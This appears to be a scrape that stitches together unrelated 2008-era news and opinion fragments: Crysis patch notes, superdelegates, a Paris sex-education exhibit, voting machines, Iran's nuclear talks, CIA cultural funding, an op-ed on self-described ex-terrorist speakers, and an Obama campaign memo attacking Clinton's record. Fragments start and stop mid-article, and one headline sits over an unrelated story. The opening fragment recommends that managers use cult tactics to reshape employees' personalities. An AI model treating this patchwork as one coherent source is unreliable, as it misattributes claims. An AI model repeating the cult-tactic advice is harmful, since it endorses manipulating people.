By getting your employee , staff , cult member involved in a group and putting them into action as a group you help create an " esprit de corp " that unifies them and helps solidify the newly created personality .
Thus , find tasks that your group can do together .
It could be a project , a field trip or anything where they have to work together as a group .
Every one of these tactics can be used and applied in your business and social settings .
If your response to this is to recoil at the idea of using cult strategies then stop it .
These strategies are used all the time in many different setting and situations .
A good manager is a person who would make a good cult leader if they choose to do it .
The benefits include highly motivated people who support the team and , when needed , can put work on hold to develop a personal life .

A Real Crysis
When the Crysis demo was released , everyone started complaining about its incredibly slow performance .
Everyone hoped that the demo was merely a half - baked , poorly - optimized shadow of the final game .
However , when Crysis itself finally hit the shelves , many were disappointed .
It was so slow that unless you had the latest and highest - end PC hardware in the market , you could end up watching a Crysis slideshow instead .
Okay , Crytek would prefer us to use the marketing - friendly term , " hardware - challenging " but let us just tell it as it is .
Crysis and its demo were real dogs on the hardware .
Even gamers armed with quad - core systems and new graphics cards like the NVIDIA GeForce 8800 GTS 512MB cannot hope to play at 1600 x 1200 with the settings set to High .
Oh , you may brave the " shakes " but wait till the snow starts falling , then you will see what we mean by watching slideshows .
Seriously , Crytek can claim they have the most graphically - advanced game in the world , but frankly , we think they could have done it without forcing everyone to upgrade .
They should take a leaf out of 2 K Games ' book .
Look at how well they did BioShock .
It had amazing graphics , as beautiful as Crysis , we dare say ; and yet , BioShock did n't require the kind of crazy hardware that Crysis needed just to run at all .
What every gamer had been clamouring for since he / she started playing Crysis is a performance patch .
Something to make the game go zoom .
An octane booster to go from a piddling 10 - 20 fps to a more exciting range like 40 - 60 fps .
The status quo was just not acceptable .
Finally !
A Patch
On January 8 , 2008 , Crytek released the long - awaited Crysis patch 1.1 which mainly addressed its performance deficiencies , as well as a few bug fixes and tweaks .
W00t !
Take a look at the change log :
Fixes
Fixed : Potential crash in D3D10
Fixed : Orange boxes apearing when hispec savegame loaded into lowspec game .
Fixed : Inconsistent damage dealt to vehicles when shot by LAW .

Impressive list of fixes and tweaks .
Will this patch finally allow gamers to run Crysis on their current hardware ?
Let 's find out ...
CO2 - Absorbing Crystals Just the Tip of Iceberg for UCLA Lab
Hannah Walker was raised on the Downtown East Side .
She has been a regular contestant in the Pivot Legal Society ‘s Hope in Shadows photography contest , which documents life in the poorest neighborhood in Canada ( life expectancy has been estimated as low as 33 years ) .
Year after year , she and her friends would line up in Vancouver ’s grey streets , often waiting in the rain for hours until they reached the head of the line and each received a disposable camera and an entry form .
After the camera was full , they ’d drop it off and wait , hopefully .
Last year , after many attempts , she won .
Hannah Walker is fourteen .
Hannah
Walker knew it would be a good shot , but the 14 - year - old never imagined her photo would be chosen to represent her Downtown Eastside community … it must have struck a chord with fellow DTES residents , who picked Walker ’s photo over 41 other entries in a public vote at the Carnegie Community Centre .
Says Pivot Communications Director Paul Ryan , “ She ’s telling people what it is like for her to live in this community and everyone saw a part of that in the photo .
I think people tend to forget children and families live here too .
It ’s not just what you see driving through East Hastings …
It ’s hopeful and inspiring . ”
You can see a younger Hannah and her buddies in this video , explaining why they ’re such enthusiastic entrants .
That ’s the kind of excitement and optimism that is kids ’ special magic and , as we can see from the fact that she did in fact win , it ’s not always as sweetly misplaced as us old cynics might think .
When a child competes against adults , it can sometimes be a bruising experience , but much more often in my experience it ’s a growth experience and kids , we learn daily , are much more resilient than adults are .
Kids come in last and say , “ The guy who won said he liked my shoelaces ! ”
And sometimes , we all win .

In September world production of total liquids increased by 450,000 barrels per day from August according to the latest figures of the International Energy Agency ( IEA ) .
Resulting in total world liquids production of 85.10 million b/d , which is 1.03 million b/d lower than the all time maximum liquids production of 86.13 million b/d reached in July 2006 .
3 ) Status of the production plateau - Both the International Energy Agency ( IEA ) and Energy Information Administration ( EIA ) figures show that global liquids production has been on a plateau since 2005 .
The IEA figures result in an average global production in 2007 up to September of 85.03 million b/d , almost to the same as the average 2006 production of 85.00 million b/d and higher than the average 2005 production of 84.10 million b/d .
The EIA puts the average global 2007 production up to July at 84.40 million b/d , slightly lower than the average 2006 production of 84.60 million b/d and the average 2005 production of 84.63 million b/d .

Until recent weeks , one of the least understood aspects of the Democrats ' primary contest was the role of superdelegates .
These are Democratic Party insiders , members of Congress , and other officials who can cast ballots at the party 's national convention this summer .
But now these unelected delegates are coming in for a close inspection , because neither Hillary Clinton nor Barack Obama can win their party 's nomination without superdelegate support .
The big Pennsylvania primary on April 22 , for example , has only 158 delegates at stake ( each of them will be pledged to support one of the candidates ) .
By comparison , there are a total of 795 superdelegates , none of whom are required to honor the will of the voters of their state at the party 's convention .
Sound undemocratic ?
It is .
That the 2008 Democratic nominee for president will be chosen by individuals no one voted for in the primaries flew for too long under the commentariat 's radar .
This from the party that litigated to " make every vote count " in the 2000 Florida recount , reviled the institution of the Electoral College for letting the loser of the national popular election win the presidency , and has called the Bush administration illegitimate ever since .
Democratic Party reforms in 1982 gave super - delegates about 20 % of convention votes -- so that party greybeards can stop a popular , but politically extreme , candidate from seizing the nomination .
The Democrats deliberately rejiggered their party 's rules to head off insurgent candidates , like a George McGovern or a Jimmy Carter , who might be crushed in the general election .
Unelected delegates thus have more than twice the votes of the richest state prize , California .
So much for unfiltered democracy .
In truth , the Democratic Party runs by rules that are the epitome of the smoke - filled room and ensure , in essence , that congressional incumbents exercise a veto power over the nomination .
On a recent weekday , Clemence Dubreuil had no school because her teachers were on strike , so the 9 - year - old begged her mother to take her to a museum to see a new exhibit about sex .
If that all sounds very French , it is : Strikes are as much a part of the national character as frank talk about sex .
But as the exhibit and the mild controversy surrounding it are proving , the cliches need some updating .
The exhibit in northeast Paris attempts to respond playfully to the serious questions tweenagers ask about sexuality and romantic feeling .
Inspired by a guide to sex by the popular cartoonist Zep and writer Helene Bruller , the exhibit also encourages children and their parents or teachers to shed all modesty and embarrassment about touchy topics and start talking .
“ The kids were talking about this stuff at school and Clemence did n’t understand , ” said her mother , Danielle Dubreuil , who prefers bringing her curious daughter to the exhibit rather than discussing such topics with her alone .

“ We talk about some things , ” the 42 - year - old mother said , hesitantly , “ but penetration -- that I had trouble with . ”
The French are well known for a more open attitude about sex and for believing that the freedom to display their bodies -- unclad on billboards or in tight street clothes -- is a fundamental cultural value , a bit like “ the pursuit of happiness ” in America .
But many people have expressed regret that , contrary to French values , sex is often taught in schools and at home through the prism of anatomy , reproduction and prevention of disease rather than the emotions surrounding it .
“ We do n’t want to replace the French family , ” said the exhibit ’s curator , Maud Gouy , “ but we want the exhibit to be another view of what goes on between men and women without it being . . . raw .
Instead , we promote respect , romantic feelings , pleasure . ”

At the Cite des Sciences et de l’Industrie science museum , Zep ’s popular character Titeuf , a sort of French version of Calvin of “ Calvin and Hobbes , ” and some of his classmates , such as the brainy Nadia , guide the visitors .
They ask questions such as , “ What does making love mean ? ” and “ If a pregnant woman eats spinach , does the baby in her tummy taste it too ? ”
( Adults are cautioned to respect bashful young visitors , giving them space to view the displays . )
A ‘ love -o- meter ’
The characters treat sexuality with humor and sometimes sarcasm .
There is a “ love - o- meter ” to measure the strength of romantic feelings , a “ pubermatic ” that shows bodies transformed during puberty , and a pinball machine where tiny balls in the shape of sperm race for eggs .
In a “ teenagers ” corner , an area isolated by curtains , the curious can put on headphones to get answers to questions such as , “ I have one breast bigger than the other , is that normal ? ”
“ What is masturbation ? ” and “ I ’m afraid to have my period , is it painful ? ”

By using cartoon drawings rather than realistic images , Gouy says , she hopes to reduce the children ’s discomfort and pique their imagination .
“ In France , kids are bombarded with sexual images -- in films , ads , songs , on the Internet , ” she said during an interview on the periphery of the exhibit , which takes up almost half of a floor of the sprawling museum .
“ To show things in a way that allows for imagination lets children come up with their own representation of sex . ”
Near a “ love mural ” drawn by Zep , which details the sexual act itself and the preliminaries , one side of a free - standing wall shows an almost life - size drawing of a boy on top of a girl with his hands under her shirt and her hands down the back of his pants ; on the other side , the girl and boy are similarly engaged but with the girl on top .
The illustrations may seem risque by American standards .
But here they are being used to coach children toward the most French of ideals -- in this case , equality .
The exhibit , aimed at 9 - to - 14 - year - olds , is intent on taking the edge off the dialogue with children about sexuality .
Take , for example , the French name for the exhibit : “ Zizi Sexuel ” -- taken from the title of Zep and Bruller ’s guide .
A zizi is an innocent word for a little boy ’s penis .
The title ’s translation in English is “ Sexual Willy . ”

But the current generation in France is not as steeped in innocence and ideals such as equality , according to educators and parents who worry that the right sexual values are no longer being instilled by osmosis .
Despite winning praise in the mainstream media for its healthy if not sometimes silly approach , the exhibit also has had objectors .
Soon after the show opened in October , SOS Education , a conservative parents group with 65,000 members nationwide , delivered several boxes of petitions to the office of the minister of education demanding that primary school parents be informed should class trips be planned to the “ corrupting ” exhibit ; the group also sent brochures previewing the exhibit ’s content to 8,000 Paris - area schools for parents to see .
( The exhibit , which runs through the end of the year , already has had 100,000 visitors , mostly schoolchildren . )
“ We do n’t have the power to shut it down , ” said Vincent Laarman of SOS Education .
“ We at least want parents to have the power to keep their children from it . ”
Advertisement
Laarman ’s group mostly objects to the “ crude ” nature of displays such as a rubber penis that children can inflate with a pump and Zep ’s “ love wall . ”
“ There is not enough about building a relationship , ” Laarman said .
“ It ’s just learning how to kiss , listening to kissing .
That ’s not about feelings . ”
But Gouy says providing real information for children can only make their journey to adulthood easier and safer ; she also notes that many parents do n’t have the time or means these days to discuss sex with them .
Easier on Maman
Before she came to the exhibit , Danielle Dubreuil would resort to Zep and Bruller ’s guide if she did n’t want to explain something to Clemence .
“ The reality is I do n’t want to talk about it . . . and here I know they ’ve done a good job , and she wo n’t be shocked . ”

While a gaggle of giggling boys pressed all the buttons on a display about the sounds of kissing , Clemence stretched out in “ Nadia ’s room ” on an enormous red-velvet bed in the shape of a heart , her arms crossed behind her head , one leg dangling over the edge .
A sweet smile spread across her lips as she gazed up at the bed canopy and watched a movie screen that displayed classic scenes of falling in love from different movies .
She saw languorous kisses and swooning lovers dancing , but also domestic disputes , breakups and heartbreak .
Her mother stood back from the bed , waiting .

Special correspondent Devorah Lauter contributed to this report .
It also has 21 electoral - college votes , a relatively large number that could decide a tight presidential race .
Among election - machine observers , this provokes a shudder of anticipation .
If the presidential vote is close , it could well come down to a recount in Pennsylvania .
And a recount could uncover thousands of votes recorded on machines that displayed aberrant behavior  with no paper trail .
Would the public accept it ?
Would the candidates ?
As Candice Hoke , the head of Ohio ’s Center for Election Integrity , puts it : “ If it was Florida in 2000 and Ohio in 2004 , everyone is saying it ’s going to be Pennsylvania in 2008 . ”
The prospect of being thrust into the national spotlight has already prompted many counties to spar over ditching their iVotronics .
The machines were an election issue in Centre County in November , with several candidates for county commissioner running on a pledge to get rid of the devices .
( Two won and are trying to figure out if they can afford it . )
And the opposition to touch - screens is n’t just coming from Democrats .
When the Pennsylvania Republican Rick Santorum lost his Senate seat in 2006 , some Santorum voters complained that the iVotronics “ flipped ” their votes before their eyes .
In Pittsburgh , the chief opponent of the machines is David Fawcett , the lone Republican on the county board of elections .
“ It ’s not a partisan issue , ” he says .
“ And even if it was , Republicans , at least in this state , would have a much greater interest in accuracy .
The capacity for error is big , and the error itself could be so much greater than it could be on prior systems . ”
GIVEN THAT THERE IS NO perfect voting system , is there at least an optimal one ?
Critics of touch - screen machines say that the best choice is “ optical scan ” technology .
With this system , the voter pencils in her vote on a paper ballot , filling in bubbles to indicate which candidates she prefers .
The vote is immediately tangible to the voters ; they see it with their own eyes , because they personally record it .
The tallying is done rapidly , because the ballots are fed into a computerized scanner .
And if there ’s a recount , the elections officials can simply take out the paper ballots and do it by hand .
Optical scanning is used in what many elections experts regard as the “ perfect elections ” of Leon County in Florida , where Ion Sancho is the supervisor of elections .
In the late ’ 80s , when the county was replacing its lever machines , Sancho investigated touch - screens .
But he did n’t think they were user - friendly , did n’t believe they would provide a reliable recount and did n’t want to be beholden to a private - sector vendor .
So he bought the optical - scanning devices from Unisys and trained his staff to be able to repair problems when the machines broke or malfunctioned .
His error rate  how often his system miscounts a ballot  is three - quarters of a percent at its highest , and has dipped as low as three - thousandths of a percent .
More important , his paper trail prevents endless fighting over the results of tight elections .
In one recent contest , a candidate claimed that his name had not appeared on the ballot in one precinct .
So Sancho went into the Leon County storage , broke the security seals on the records , and pulled out the ballots .
The name was there ; the candidate was wrong .
“ He apologized to me , ” Sancho recalls .
“ And that ’s what you ca n’t do with touch - screen technology .
You never could have proven to that person ’s satisfaction that the screen did n’t show his name .
I like that certainty .
The paper ends the discussion . ”
Sancho has never had a legal fight over a disputed election result .
“ The losers have admitted they lost , which is what you want , ” he adds .
“ You have to be able to convince the loser they lost . ”
That , in a nutshell , is what people crave in the highly partisan arena of modern American politics : an election that can be extremely close and yet regarded by all as fair .
Not only must the losing candidate believe in the loss ; the public has to believe in it , too .
This is why Florida ’s governor , Charlie Crist , stung by the debacle in Sarasota , persuaded the state to abandon its iVotronic machines before the 2008 presidential elections and adopt optical scanning ; and why , in Ohio , Cuyahoga County is planning to spend up to $ 12 million to switch to optical scanning in the next year ( after the county paid $ 21 million for its touch - screens just a few years ago ) .
UN inspectors can visit the Arak plant under the agreement
The claim was made in a text outlining a timetable for co-operation with the International Atomic Energy Agency , which was agreed at talks last week .
It would be the first serious issue closed by the IAEA during its four - year inquiry into Iran 's nuclear activities .
Western powers suspect Iran of building a nuclear weapons capability .
Tehran says its nuclear programme is peaceful .
The UN Security Council has already imposed two rounds of sanctions against Iran for defying its calls to halt uranium enrichment and plutonium reprocessing , and answer IAEA questions .
' Real limitations '
The five - page text of the Iran - IAEA accord was released in Vienna on Monday .
It said the IAEA accepted that " earlier statements made by Iran [ on the issue of plutonium ] are consistent with the agency 's findings , and thus this matter is resolved . "
Iran also said it would co-operate on resolving concerns over documents that allegedly show Iran has a secret military project for developing nuclear arms .
However , it dismissed the claims as " politically motivated " and " baseless allegations " .
Last week , Iran and the IAEA announced that they had agreed a timeline for implementing a plan to clarify Tehran 's nuclear programme , first announced in July .
However , US envoy to the IAEA , Gregory Schulte , said the plan had " real limitations " and accused Iran of manipulating the IAEA as a way to avoid harsher sanctions .
He said Iran was still defying the UN's key demand for it to halt its uranium enrichment activities and said the US would continue to push for a third round of sanctions .

So far as I know , I have never taken money from the C.I.A. ( though I have worked for some organizations that have had C.I.A. connections , including , apparently , my present employer ) .
The same ca n’t be said for any number of prominent writers and artists , from Arthur Schlesinger Jr. to Jackson Pollock .
During the early years of the cold war , they were supported , sometimes lavishly , always secretly , by the C.I.A. as part of its propaganda war against the Soviet Union .
It was perhaps the most successful use of “ soft power ” in American history .
Yet once the facts came out in 1967 the episode became a source of scandal and controversy that continues to percolate to this day .
How close should presumably independent intellectuals get to their government ?
Many books and articles were written about all this until 1999 , when one book , Frances Stonor Saunders ’ “ Cultural Cold War , ” swept the field .
Saunders was highly critical of the “ octopus - like C.I.A. ” and those intellectuals who allowed themselves to be used as pawns in the government ’s cold war game .
But though her book was diligently researched and vigorously argued , it can hardly be considered the last word — if only because the issue does n’t allow for last words .
Now the historian Hugh Wilford has come out with “ The Mighty Wurlitzer , ” and it can be seen as a direct rejoinder to Saunders .
The story , Wilford says , is complicated .
Far from being pawns , the intellectuals on the C.I.A. payroll were willing participants in what they understood as the legitimate cause of opposing Soviet tyranny .
They took money for what they would have done anyway ; the C.I.A. simply allowed them to be more effective at doing it .
Who was using whom ?
Even more complicated is the question of secrecy .
Many , if not most of the beneficiaries did n’t know where the money was coming from ( or did n’t want to know ) .
They professed outrage when the truth was revealed .
Were they right to be upset ?
There ’s enough ethical quicksand here to sink an aircraft carrier .
It ’s clear that the C.I.A. ’s cultural war would n’t have been nearly as effective if it had been public ( if only because Congress would never have agreed to subsidize the American liberals , European Socialists and avant - garde artists that the sophisticated C.I.A. was happy to take under its wing ) .
The controversy over secrecy seems to boil down to ends and means : the end was preventing Communist domination of Europe ; the means were those that spy agencies , but not artists and writers , are accustomed to using .
Wilford himself would have preferred the program to be public , but his book suggests we should be careful before rushing to judgment .
He quotes several unapologetic participants , including Diana Trilling : “ I never liked the secrecy but was willing to live with it because I thought we were doing useful work . ”

WASHINGTON  Moving with uncommon speed , Congress gave final approval on Thursday to a $ 168 billion economic rescue package , including rebates for taxpayers and tax breaks for businesses , that lawmakers and President Bush hope will set off a rush of springtime spending and spark the slowing economy .
A day after the Senate seemed mired in a partisan feud over a more expensive stimulus plan favored by Democrats , lawmakers cast that quarrel aside and approved a plan nearly identical to one the House adopted last week .
The Senate , voting 81 to 16 , slightly expanded the House plan to include payments for some 20 million Social Security recipients and 250,000 disabled veterans who would not have qualified because they do not earn income .
The final measure also specifies that illegal immigrant workers not receive payments .
The House swiftly approved those changes by a vote of 380 to 34 and sent the bill to the White House , where Mr. Bush had already said he would sign it .
Walid Shoebat , Kamal Saleem and Zachariah Anani are the three stooges of the Christian right .
These self - described former Muslim terrorists are regularly trotted out at Christian colleges — a few days ago they were at the Air Force Academy — to spew racist filth about Islam on behalf of groups such as Focus on the Family .
It is a clever tactic .
Curly , Larry and Mo , who all say they are born - again Christians , engage in hate speech and assure us it comes from personal experience .
They tell their audiences that the only way to deal with one - fifth of the world ’s population is by converting or eradicating all Muslims .
Their cant is broadcast regularly on Fox News , including the Bill O’Reilly and Neil Cavuto shows , as well as on numerous Christian radio and television programs .
Shoebat , who has written a book called “ Why We Want to Kill You , ” promises in his lectures to explain the numerous similarities between radical Muslims and the Nazis , how “ Muslim terrorists ” invaded America 30 years ago and how “ perseverance , recruitment and hate ” have fueled attacks by Muslims .
These men are frauds , but this is not the point .
They are part of a dark and frightening war by the Christian right against tolerance that , in the moment of another catastrophic terrorist attack on American soil , would make it acceptable to target and persecute all Muslims , including the some 6 million Muslims who live in the United States .
These men stoke these irrational fears .
They defend the perpetual war unleashed by the Bush administration and championed by Sen. John McCain .
McCain frequently reminds listeners that “ the greatest danger facing the world is Islamic terrorism , ” as does Mike Huckabee , who says that “ Islamofascism ” is “ the greatest threat this country [ has ] ever faced . ”
George W. Bush has , in the same vein , assured Americans that terrorists hate us for our freedoms , not , of course , for anything we have done .
Bush described the “ war on terror ” as a war against totalitarian Islamofascism while the Israeli air force was dropping tens of thousands of pounds of iron fragmentation bombs up and down Lebanon , an air campaign that killed 1,300 Lebanese civilians .
The three men tell lurid tales of being recruited as children into Palestinian terrorist organizations , murdering hundreds of civilians and blowing up a bank in Israel .
Saleem says that as a child he infiltrated Israel to plant bombs via a network of tunnels underneath the Golan Heights , although no incident of this type was ever reported in Israel .
He claims he is descended from the “ grand wazir ” of Islam , a title and a position that do not exist in the Arab world .
They assure audiences that the Palestinians are interested not in a peaceful two - state solution but rather the destruction of Israel , the murder of all Jews and the death of America .
Shoebat claims he first came to the United States as part of an extremist “ sleeper cell . ”
“ These three jokers are as much former Islamic terrorists as ‘ Star Trek ’s ’ Capt .
James T. Kirk was a real Starship captain , ” said Mikey Weinstein , the head of the watchdog group The Military Religious Freedom Foundation .
The group has challenged Christian proselytizing in the military and denounced the visit by the men to the Air Force Academy .
The speakers include in their talks the superior virtues of Christianity .
Saleem , for example , says his world “ turned upside down when he was seriously injured in an automobile accident . ”
“ A Christian man tended to Kamal at the accident scene , making sure he got the medical treatment he needed , ” his Web site says .
“ Kamal ’s orthopedic surgeon and physical therapist were also Christian men whom over a period of several months ministered the unconditional love of Jesus Christ to him as he recovered .
The love and sacrificial giving of these men caused Kamal to cry out to the God of Abraham , Isaac and Jacob acknowledging his need for the Savior .
Kamal has since become a man on a new mission , as an ambassador for the one true and living God , the great I Am , Jehovah God of the Bible . ”
This creeping Christian chauvinism has infected our political and social discourse .
It was behind the rumor that Barack Obama was a Muslim .
Obama reassured followers that he was a Christian .
It apparently did not occur to him , or his questioners , that the proper answer is that there is nothing wrong with being a Muslim , that persons of great moral probity and courage arise in all cultures and all religions , including Islam .
Christians have no exclusive lock on virtue .
But this kind of understanding often provokes indignant rage .
The public denigration of Islam , and by implication all religious belief systems outside Christianity , is part of the triumphalism that has distorted the country since the 9/11 attacks .
It makes dialogue with those outside our “ Christian ” culture impossible .
It implicitly condemns all who do not think as we think and believe as we believe as , at best , inferior and usually morally depraved .
It blinds us to our own failings .
It makes self - reflection and self - criticism a form of treason .
It reduces the world to a cartoonish vision of us and them , good and evil .
It turns us into children with bombs .
These three con artists are not the problem .
There is enough scum out there to take their place .
Rather , they offer a window into a worldview that is destroying the United States .
It has corrupted the Republican Party .
It has colored the news media .
It has entered into the everyday clichés we use to explain ourselves to ourselves .
It is ignorant and racist , but it is also deadly .
It grossly perverts the Christian religion .
It asks us to kill to purify the Earth .
It leaves us threatened not only by the terrorists who may come from abroad but the ones who are rising from within our midst .

Nevertheless , some people try .
Ms. Brown and Mr. Friedman  who of course were thrilled to have a child , like all the later - in - life parents interviewed for this article  were also determined not to let Harrison “ take control of the house , ” Ms. Brown said .
They went ahead with putting in flat - front lacquered maple cabinets in the kitchen , even though they soon had to watch a professional babyproofer drill 300 holes in them for safety latches .
( Ms. Brown still cringes . )
They put up silk Shantung draperies in Harrison ’s bedroom , knowing that they might well end up stained , as they soon did  with yogurt .
And they held onto the molded - wood chairs , which were not an easy transition from the highchair .
“ They have a very sleek bottom , ” Ms. Brown explained .
“ He slides off it . ”
OTHERS , like Debra Cherney , 49 , and Hartley Bernstein , 56 , were more resigned to giving up control .
They were possibly even happier than most late parents at the birth of their twins , a boy and a girl named Cole and Brooke , in 2003 , having lost their daughter Raine to respiratory failure in 2001 .
When the twins became mobile , the couple realized that they would need to create a designated play space in their prewar Park Avenue apartment .
Still , the room they sacrificed  the formal dining room  was tough .
“ I ’m pretty sensitive aesthetically , and it does something for me when I look at a pretty room , ” Ms. Cherney said .
“ Looking at what the room used to be was the visual equivalent of listening to Bach or Mozart .
Now it ’s the visual equivalent of listening to Barney . ”
She felt the full impact when she and Mr. Bernstein put their 18th - century mahogany dining table and chair set in storage .
“ When I bought the table I was envisioning these beautiful , lovely dinners with fine china , ” she said .
“ Once you have kids and once you give up those things , it was like , ‘ Who was I kidding ? ’
I remember thinking this room will look nice again  in about 18 years . ”

Since you can buy just about anything on Amazon , I ’ve noticed lately that those little recommendation algorithms are slipping out of tune .
Specifically , the “ Buy Together With ” recommendations that pop up when you ’re viewing an item someone else may have recently purchased .
Sometimes these recommendations are spot on and I really did want to buy a pack of decaf coffee pods with my regular coffee pods , thank you very much .
But sometimes , and perhaps more often than not , I ’m staring at the screen saying , “ Really , Amazon ?
Really ? ! ”
Like when I was checking out this cool New York motif mug and Amazon suggested I buy it with a coin bank .
Perhaps this makes sense in a robotically comical way .
Perhaps Amazon is thinking , “ Well , if you ’re going to New York , start saving your pennies ! ” or something equally cheeky and annoying .
After campaigning for more than a year , spending more than $ 180 million between them , and facing voters in more than half the states , Hillary Clinton and Barack Obama are essentially tied in their battle for the Democratic presidential nomination .
Super Tuesday did nothing to break the deadlock .
With the dust still settling , the New York senator as of yesterday afternoon claimed 1,000 delegates out of the 2,025 needed .
Her Illinois colleague had 902 .

Senator Clinton 's Claims of Foreign Policy Experience Are Exaggerated
To : Interested Parties
From : Greg Craig , former director , Policy Planning Office , U.S. State Department
RE : Senator Clinton 's claim to be experienced in foreign policy : Just words ?
DA : March 11 , 2008
When your entire campaign is based upon a claim of experience , it is important that you have evidence to support that claim .
Hillary Clinton 's argument that she has passed " the Commander - in - Chief test " is simply not supported by her record .
There is no doubt that Hillary Clinton played an important domestic policy role when she was First Lady .
It is well known , for example , that she led the failed effort to pass universal health insurance .
There is no reason to believe , however , that she was a key player in foreign policy at any time during the Clinton Administration .
She did not sit in on National Security Council meetings .
She did not have a security clearance .
She did not attend meetings in the Situation Room .
She did not manage any part of the national security bureaucracy , nor did she have her own national security staff .
She did not do any heavy - lifting with foreign governments , whether they were friendly or not .
She never managed a foreign policy crisis , and there is no evidence to suggest that she participated in the decision - making that occurred in connection with any such crisis .
As far as the record shows , Senator Clinton never answered the phone either to make a decision on any pressing national security issue - not at 3 AM or at any other time of day .
When asked to describe her experience , Senator Clinton has cited a handful of international incidents where she says she played a central role .
But any fair - minded and objective judge of these claims - i.e. , by someone not affiliated with the Clinton campaign - would conclude that Senator Clinton 's claims of foreign policy experience are exaggerated .
Northern Ireland :
Senator Clinton has said , " I helped to bring peace to Northern Ireland . "
It is a gross overstatement of the facts for her to claim even partial credit for bringing peace to Northern Ireland .
She did travel to Northern Ireland , it is true .
First Ladies often travel to places that are a focus of U.S. foreign policy .
But at no time did she play any role in the critical negotiations that ultimately produced the peace .
As the Associated Press recently reported , " [ S ] he was not directly involved in negotiating the Good Friday peace accord . "
With regard to her main claim that she helped bring women together , she did participate in a meeting with women , but , according to those who know best , she did not play a pivotal role .
The person in charge of the negotiations , former Senator George Mitchell , said that " [ The First Lady ] was one of many people who participated in encouraging women to get involved , not the only one . "
News of Senator Clinton 's claims has raised eyebrows across the ocean .
Her reference to an important meeting at the Belfast town hall was debunked .
Her only appearance at the Belfast City Hall was to see Christmas lights turned on .
She also attended a 50 - minute meeting which , according to the Belfast Daily Telegraph 's report at the time , " [ was ] a little bit stilted , a little prepared at times . "
Brian Feeney , an Irish author and former politician , sums it up : " The road to peace was carefully documented , and she wasnâ€™t on it . "
Bosnia :
Senator Clinton has pointed to a March 1996 trip to Bosnia as proof that her foreign travel involved a life - risking mission into a war zone .
She has described dodging sniper fire .
While she did travel to Bosnia in March 1996 , the visit was not a high - stakes mission to a war zone .
On March 26 , 1996 , the New York Times reported that " Hillary Rodham Clinton charmed American troops at a U.S.O. show here , but it did n't hurt that the singer Sheryl Crow and the comedian Sinbad were also on the stage . "
Kosovo :
Senator Clinton has said , " I negotiated open borders to let fleeing refugees into safety from Kosovo . "
It is true that , as First Lady , she traveled to Macedonia and visited a Kosovar refugee camp .
It is also true that she met with government officials while she was there .
First Ladies frequently meet with government officials .
Her claim to have " negotiated open borders to let fleeing refugees into safety from Kosovo , " however , is not true .
Her trip to Macedonia took place on May 14 , 1999 .
The borders were opened the day before , on May 13 , 1999 .
The negotiations that led to the opening of the borders were accomplished by the people who ordinarily conduct negotiations with foreign governments - U.S. diplomats .
President Clinton 's top envoy to the Balkans , former Ambassador Robert Gelbard , said , " I can not recall any involvement by Senator Clinton in this issue . "
Ivo Daalder worked on the Clinton Administration 's National Security Council and wrote a definitive history of the Kosovo conflict .
He recalls that " she had absolutely no role in the dirty work of negotiations . "
Rwanda :
Last year , former President Clinton asserted that his wife pressed him to intervene with U.S. troops to stop the Rwandan genocide .
When asked about this assertion , Hillary Clinton said it was true .
There is no evidence , however , to suggest that this ever happened .
Even those individuals who were advocating a much more robust U.S. effort to stop the genocide did not argue for the use of U.S. troops .
No one recalls hearing that Hillary Clinton had any interest in this course of action .
Based on a fair and thorough review of National Security Council deliberations during those tragic months , there is no evidence to suggest that U.S. military intervention was ever discussed .
Prudence Bushnell , the Assistant Secretary of State with responsibility for Africa , has recalled that there was no consideration of U.S. military intervention .
At no time prior to her campaign for the presidency did Senator Clinton ever make the claim that she supported intervening militarily to stop the Rwandan genocide .
It is noteworthy that she failed to mention this anecdote - urging President Clinton to intervene militarily in Rwanda - in her memoirs .
President Clinton makes no mention of such a conversation with his wife in his memoirs .
And Madeline Albright , who was Ambassador to the United Nations at the time , makes no mention of any such event in her memoirs .
Hillary Clinton did visit Rwanda in March 1998 and , during that visit , her husband apologized for America 's failure to do more to prevent the genocide .
China :
Senator Clinton also points to a speech that she delivered in Beijing in 1995 as proof of her ability to answer a 3 AM crisis phone call .
It is strange that Senator Clinton would base her own foreign policy experience on a speech that she gave over a decade ago , since she so frequently belittles Barack Obamaâ€™s speeches opposing the Iraq War six years ago .
Let there be no doubt : she gave a good speech in Beijing , and she stood up for women 's rights .
But Senator Obama 's opposition to the War in Iraq in 2002 is relevant to the question of whether he , as Commander - in - Chief , will make wise judgments about the use of military force .
Senator Clinton 's speech in Beijing is not .
Senator Obama 's speech opposing the war in Iraq shows independence and courage as well as good judgment .
In the speech that Senator Clinton says does not qualify him to be Commander in Chief , Obama criticized what he called " a rash war . . . a war based not on reason , but on passion , not on principle , but on politics . "
In that speech , he said prophetically : " [ E ] ven a successful war against Iraq will require a US occupation of undetermined length , at undetermined cost , with undetermined consequences . "
He predicted that a U.S. invasion of Iraq would " fan the flames of the Middle East , " and " strengthen the recruitment arm of al Qaeda . "
He urged the United States first to " finish the fight with Bin Laden and al Qaeda . "
If the U.S. government had followed Barack Obama 's advice in 2002 , we would have avoided one of the greatest foreign policy catastrophes in our nation 's history .
Some of the most " experienced " men in national security affairs - Vice President Cheney and Secretary Donald Rumsfeld and others - led this nation into that catastrophe .
That lesson should teach us something about the value of judgment over experience .
Longevity in Washington , D.C. does not guarantee either wisdom of judgment .
Conclusion :
The Clinton campaign 's argument is nothing more than mere assertion , dramatized in a scary television commercial with a telephone ringing in the middle of the night .
There is no support for or substance in the claim that Senator Clinton has passed " the Commander - in - Chief test . "
That claim - as the TV ad - consists of nothing more than making the assertion , repeating it frequently to the voters and hoping that they will believe it .
On the most critical foreign policy judgment of our generation - the War in Iraq - Senator Clinton voted in support of a resolution entitled " The Joint Resolution to Authorize the Use of U.S. Military Force Against Iraq . "
As she cast that vote , she said : " This is probably the hardest decision I have ever had to make - any vote that may lead to war should be hard - but I cast it with conviction . "
In this campaign , Senator Clinton has argued - remarkably - that she was n't actually voting for war , she was voting for diplomacy .
That claim is no more credible than her other claims of foreign policy experience .
The real tragedy is that we are still living with the terrible consequences of her misjudgment .
The Bush Administration continues to cite that resolution as its authorization - like a blank check - to fight on with no end in sight .
Barack Obama has a very simple case .
On the most important commander in chief test of our generation , he got it right , and Senator Clinton got it wrong .
In truth , Senator Obama has much more foreign policy experience than either Bill Clinton or Ronald Reagan had when they were elected .
Senator Obama has worked to confront 21st century challenges like proliferation and genocide on the Senate Foreign Relations Committee .
He possesses the personal attributes of a great leader - an even temperament , an open - minded approach to even the most challenging problems , a willingness to listen to all views , clarity of vision , the ability to inspire , conviction and courage .
